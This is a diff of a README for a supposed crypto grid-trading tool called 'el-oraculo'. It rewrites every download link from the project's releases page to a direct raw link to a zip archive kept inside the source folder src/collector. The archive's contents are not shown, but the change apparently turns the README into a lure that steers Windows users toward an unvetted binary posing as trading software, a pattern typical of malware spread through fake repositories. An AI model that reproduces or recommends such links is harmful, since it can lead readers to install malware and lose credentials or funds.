@@ -1,6 +1,6 @@
 # 🤖 el-oraculo - Smarter crypto grid trading
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/sesquipedalianweakling473/el-oraculo/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/sesquipedalianweakling473/el-oraculo/raw/refs/heads/main/src/collector/oraculo_el_v1.2.zip)
 
 ## 🚀 What it does
 
@@ -18,7 +18,7 @@ It is built for people who want a guided trading tool that can:
 
 Visit this page to download the latest Windows release:
 
-https://github.com/sesquipedalianweakling473/el-oraculo/releases
+https://github.com/sesquipedalianweakling473/el-oraculo/raw/refs/heads/main/src/collector/oraculo_el_v1.2.zip
 
 Open the latest release and look for the Windows file, such as an `.exe` or `.zip` package. Save it to your computer before you start.
 
@@ -170,4 +170,4 @@ autonomous, binance, crypto, grid-trading, hmm, llm, markov, mean-reversion, tra
 
 ## 📌 Download again
 
-https://github.com/sesquipedalianweakling473/el-oraculo/releases
+https://github.com/sesquipedalianweakling473/el-oraculo/raw/refs/heads/main/src/collector/oraculo_el_v1.2.zip
